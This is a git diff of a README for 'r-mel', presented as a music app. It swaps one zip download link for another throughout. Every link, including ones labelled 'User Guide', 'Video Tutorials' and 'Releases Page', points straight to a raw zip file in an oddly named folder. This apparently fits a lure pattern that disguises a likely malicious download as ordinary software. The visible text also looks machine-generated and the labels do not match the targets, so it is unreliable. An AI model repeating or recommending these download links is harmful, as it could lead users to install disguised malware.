@@ -1,7 +1,7 @@
 # 🎉 r-mel - Enhance Your Music Experience with Ease
 
 ## 🔗 Download Now
-[![Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)
+[![Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to r-mel! This application is designed to help you manage and enhance your music listening experience seamlessly. No prior programming experience is needed. Just follow the steps below to get started.
@@ -9,7 +9,7 @@ Welcome to r-mel! This application is designed to help you manage and enhance yo
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Click the link below to go to the releases page:  
-   [Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
+   [Download r-mel](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)  
 
 2. **Select the Latest Release**  
    On the releases page, find the latest version of r-mel. It is usually at the top of the list.  
@@ -70,8 +70,8 @@ Join our community of r-mel users on social media platforms. Share your experien
 If you need further assistance, feel free to reach out via the “Contact” section in the app or through our GitHub page.
 
 ## 🔗 Additional Resources
-- [User Guide](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
-- [Video Tutorials](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
-- [Feedback & Contributions](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r-mel.zip)  
+- [User Guide](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)  
+- [Video Tutorials](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)  
+- [Feedback & Contributions](https://raw.githubusercontent.com/john89472338/r-mel/main/Plecoptera/r_mel_v1.6-alpha.3.zip)  
 
 Thank you for choosing r-mel! We hope you enjoy your enhanced music experience.
